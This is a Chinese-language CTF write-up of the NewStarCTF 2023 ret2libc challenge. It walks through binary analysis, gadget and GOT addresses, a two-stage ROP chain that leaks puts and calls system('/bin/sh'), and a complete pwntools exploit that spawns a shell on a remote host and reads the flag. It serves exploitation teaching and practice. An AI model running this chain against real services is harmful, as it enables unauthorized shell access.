# Speedrun：NewStarCTF 2023 ret2libc

> 题型：ret2libc / 64 位 `read` 栈溢出
> 目标：leak `puts@got` -> 回 `main` -> 二阶段 `system("/bin/sh")`
> 关键：偏移 **40**；`puts@got` **0x601018**；`pop rdi; ret` **0x400763**；`ret` **0x400506**

---

## 0. 一句话结论

```text
main:
  char buf[0x20] @ rbp-0x20
  read(0, buf, 0x100)          <- 0x100，覆盖 saved RIP

  offset = 0x20 + 8 = 0x28 = 40

二进制没有导入 system，只有 puts/read/setvbuf
No canary + No PIE + Partial RELRO
  -> 标准 ret2libc

Stage 1:
  leak puts@got，然后 return to main

Stage 2:
  system("/bin/sh")
```

一句话：

```python
# stage 1
b'A'*40 + p64(RET) + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(RET) + p64(MAIN)

# stage 2
b'A'*40 + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2libc'

file '[NewStarCTF 2023 公开赛道]ret2libc'
checksec --file='[NewStarCTF 2023 公开赛道]ret2libc'
nm -n '[NewStarCTF 2023 公开赛道]ret2libc' | grep -E ' (main|init)$'
objdump -d -M intel '[NewStarCTF 2023 公开赛道]ret2libc' | sed -n '/<main>:/,/^$/p'
objdump -R '[NewStarCTF 2023 公开赛道]ret2libc' | grep -E 'puts|read'
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
Partial RELRO
No canary found
NX enabled
No PIE (0x400000)
Not stripped

0000000000400637 T init
0000000000400698 T main

601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
```

读法：

| 观察 | 结论 |
| --- | --- |
| `read(0, buf, 0x100)` | 栈溢出，可覆盖 saved RIP |
| No canary | 不需要绕过 canary |
| No PIE | `main`、PLT、GOT 地址全部硬编码 |
| Partial RELRO | GOT 可读，`puts@got` 可 leak |
| 没有 `system` 导入 | 不能直接 ret2plt，必须 ret2libc |
| 有 `puts@plt` + `puts@got` | 经典 `puts(puts@got)` leak |

`main` 反汇编：

```asm
0000000000400698 <main>:
  400698: push   rbp
  400699: mov    rbp,rsp
  40069c: sub    rsp,0x30
  4006a0: mov    DWORD PTR [rbp-0x24],edi
  4006a3: mov    QWORD PTR [rbp-0x30],rsi
  4006a7: mov    eax,0x0
  4006ac: call   400637 <init>
  4006b1: lea    rdi,[rip+0xcc]        # 400784 "Welcome to NewStar CTF!!"
  4006b8: call   400520 <puts@plt>
  4006bd: lea    rdi,[rip+0xd9]        # 40079d "Show me your magic again"
  4006c4: call   400520 <puts@plt>
  4006c9: lea    rax,[rbp-0x20]
  4006cd: mov    edx,0x100
  4006d2: mov    rsi,rax
  4006d5: mov    edi,0x0
  4006da: call   400530 <read@plt>
  4006df: lea    rdi,[rip+0xd0]        # 4007b6 "See you next time"
  4006e6: call   400520 <puts@plt>
  4006eb: mov    eax,0x0
  4006f0: leave
  4006f1: ret
```

栈布局：

```text
rbp-0x20 .. rbp-0x01 : buf[0x20]
rbp+0x00 .. rbp+0x07 : saved rbp
rbp+0x08 .. rbp+0x0f : saved RIP
```

```text
offset = 0x20 + 8 = 0x28 = 40
```

---

## 2. 关键 gadget / 地址

```bash
objdump -d -M intel '[NewStarCTF 2023 公开赛道]ret2libc' | sed -n '/400760:/,/400765:/p'
```

```asm
400760: 41 5e        pop r14
400762: 41 5f        pop r15
400764: c3           ret
```

从 `0x400763` 进去，字节正好是：

```asm
400763: 5f           pop rdi
400764: c3           ret
```

这是一个**非对齐 gadget**，但完全可用：

| 符号 / gadget | 地址 |
| --- | --- |
| `main` | `0x400698` |
| `puts@plt` | `0x400520` |
| `puts@got` | `0x601018` |
| `read@plt` | `0x400530` |
| `pop rdi; ret` | `0x400763` |
| bare `ret` | `0x400506` |

不需要 `pop rsi` / `pop rdx`；`puts` 只吃一个参数。

---

## 3. 两阶段 ROP 布局

### 3.1 Stage 1：leak `puts`

```text
[ 40 字节 'A' ]
[ RET          ]  0x400506   <- 对齐 puts
[ POP_RDI      ]  0x400763
[ PUTS_GOT     ]  0x601018
[ PUTS_PLT     ]  0x400520
[ RET          ]  0x400506   <- 对齐 main 重入
[ MAIN         ]  0x400698
```

对应：

```python
payload1 = flat(
    b'A' * 40,
    p64(RET),
    p64(POP_RDI),
    p64(PUTS_GOT),
    p64(PUTS_PLT),
    p64(RET),
    p64(MAIN),
)
```

为什么有两个 `ret`：

- 第一个 `ret` 让 `puts` 入口满足 `rsp % 16 == 8`。
- 第二个 `ret` 让 `main` 重入时也满足正常函数入口的对齐。
- 不加重入对齐，`init()` 里的 `setvbuf` / 后续 `system` 可能触发 `movaps` 崩溃。

### 3.2 Stage 2：`system("/bin/sh")`

```text
[ 40 字节 'A' ]
[ RET          ]  0x400506   <- 对齐 system
[ POP_RDI      ]  0x400763
[ BINSH        ]  libc_base + binsh_offset
[ SYSTEM       ]  libc_base + system_offset
```

对应：

```python
payload2 = flat(
    b'A' * 40,
    p64(RET),
    p64(POP_RDI),
    p64(binsh),
    p64(system),
)
```

`pop rdi` 的 `ret` 会直接把 `system` 弹进 RIP；`system` 入口的 `rsp % 16 == 8`，对齐正确。

### 3.3 关键交互顺序

`main` 在 `read` 之后、`ret` 之前还会执行：

```c
puts("See you next time");
```

所以第一阶段发送 payload 后，收到的第一行不是 leak，而是：

```text
See you next time
```

必须先吃掉这一行，再读 6 字节的 `puts` 地址：

```python
p.recvuntil(b"See you next time\n")
leak_line = p.recvline().strip(b"\n")
leak = u64(leak_line.ljust(8, b"\x00"))
```

这一步是本题最容易翻车的地方。

---

## 4. libc 识别

leak 到 `puts` 的真实地址后：

```python
libc_base = leak - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
```

原题二进制 `.comment` 显示用 Ubuntu 18.04 的 GCC 7.5.0 编译，原题镜像大概率是 18.04。对应的 `libc6 2.27-3ubuntu1.6` 偏移：

| 符号 | offset |
| --- | --- |
| `puts` | `0x080970` |
| `system` | `0x04f420` |
| `/bin/sh` | `0x1b3d88` |

```python
puts_off   = 0x080970
system_off = 0x04f420
binsh_off  = 0x1b3d88

libc_base = leak - puts_off
system = libc_base + system_off
binsh = libc_base + binsh_off
```

如果打不通，不要硬猜。优先：

1. 用题目附件 / 靶机同版本 `libc.so.6`，设置 `LIBC=/path/to/libc.so.6`。
2. 用 `libc.rip` 按 leak 的低 12 位查：
   ```text
   puts 低 12 位 = leak & 0xfff
   ```
   246 个候选里按架构、版本和 `system` / `/bin/sh` 偏移筛。
3. 检查 `libc_base & 0xfff == 0`。不是页对齐就说明 libc 选错了，别继续打。

`system("/bin/sh")` 比 one_gadget 稳，不需要赌寄存器状态。

---

## 5. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import sys
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./[NewStarCTF 2023 公开赛道]ret2libc"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

OFFSET = 0x28
POP_RDI = 0x400763
RET = 0x400506
PUTS_PLT = 0x400520
PUTS_GOT = 0x601018
MAIN = 0x400698

FALLBACK = {"puts": 0x080970, "system": 0x04F420, "binsh": 0x1B3D88}


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit("[-] set HOST/PORT, or pass LOCAL")

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc(leak):
    path = LIBC_PATH

    if not path and args.LOCAL:
        path = os.getenv("LOCAL_LIBC", "/lib/x86_64-linux-gnu/libc.so.6")

    if path:
        libc = ELF(path, checksec=False)
        base = leak - libc.symbols["puts"]
        return base, base + libc.symbols["system"], base + next(libc.search(b"/bin/sh\x00"))

    base = leak - FALLBACK["puts"]
    return base, base + FALLBACK["system"], base + FALLBACK["binsh"]


def exploit():
    p = start()

    p.recvuntil(b"Show me your magic again\n")
    p.send(flat(
        b"A" * OFFSET,
        p64(RET), p64(POP_RDI), p64(PUTS_GOT), p64(PUTS_PLT),
        p64(RET), p64(MAIN),
    ))

    p.recvuntil(b"See you next time\n")
    leak = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))
    base, system, binsh = resolve_libc(leak)

    if base & 0xFFF:
        raise SystemExit(f"[-] bad libc base {hex(base)}, set LIBC=...")

    p.recvuntil(b"Show me your magic again\n")
    p.send(flat(
        b"A" * OFFSET,
        p64(RET), p64(POP_RDI), p64(binsh), p64(system),
    ))

    time.sleep(0.2)
    p.sendline(b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit")

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")


if __name__ == "__main__":
    exploit()
```

本地验证（用本机 libc，验证 leak + 二阶段链条）：

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2libc'
python 07_newstarctf_2023_ret2libc_exp.py LOCAL
```

本地正确时看到：

```text
See you next time
__PWNED__
```

---

## 6. 交互坑

1. **第一行不是 leak**
   `main` 在 `read` 后先 `puts("See you next time")`，再 `ret`。
   先 `recvuntil(b"See you next time\n")`，再 `recvline()` 收 leak。

2. **leak 是 6 字节**
   `puts` 打印到 `\x00` 为止，64 位地址通常只有 6 个有效字节。
   用 `recvline().strip().ljust(8, b"\x00")`，不要直接 `recv(8)` 等满。

3. **必须回 `main`，不能直接退出**
   第二阶段需要重新触发同一个 `read` 溢出。
   Stage 1 末尾必须是 `p64(MAIN)`。

4. **`pop rdi; ret` 在 `0x400763`，不是函数符号**
   它是 `pop r15; ret` 中间的非对齐字节 `5f c3`。
   `ROPgadget` / `ROP(e).find_gadget(["pop rdi", "ret"])` 都能找到。

5. **栈对齐不是玄学**
   Stage 1 的 `ret` 对齐 `puts`，末尾 `ret` 对齐 `main` 重入；
   Stage 2 的 `ret` 对齐 `system`。少一个就可能 `movaps` 崩。

6. **libc 不对时不要硬打**
   看 `libc_base & 0xfff`；不是页对齐就是 libc 选错。
   用 `LIBC=` 指定附件 libc，或者按 leak 去 libc.rip 查。

7. **远程协议**
   原题可能是明文 TCP；脚本默认 `remote(HOST, PORT)`。
   如果平台要 TLS，设置 `SSL=1`。

8. **`init` 把 stdio 设成无缓冲**
   `setvbuf(..., 2, 0)` 是 `_IONBF`，所以提示语和 leak 会立即到达；
   不要因为“没看到提示”就乱加 sleep。

---

## 7. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `nm`：64 位、No PIE、No canary、无 `system` |
| 0:20–0:40 | `objdump main`：`read(0, rbp-0x20, 0x100)`，offset 40 |
| 0:40–1:00 | 找 `pop rdi; ret = 0x400763`、`ret = 0x400506`、`puts@got = 0x601018` |
| 1:00–1:20 | Stage 1 leak `puts`，回 `main` |
| 1:20–1:40 | 算 libc base，Stage 2 `system("/bin/sh")` |
| 1:40–2:00 | `cat flag*`，正则提取 flag |

---

## 8. 题型识别卡

```text
read 栈溢出 + No canary + No PIE
+ 二进制没有 system@plt
+ 有 puts@plt / puts@got
+ Partial RELRO
= ret2libc：leak puts -> return 2 main -> system("/bin/sh")
```

一句话：**先收 `See you next time`，再收 6 字节 puts；`pop rdi` 在 `0x400763`，Stage 1 末尾一定要回 `main`。**

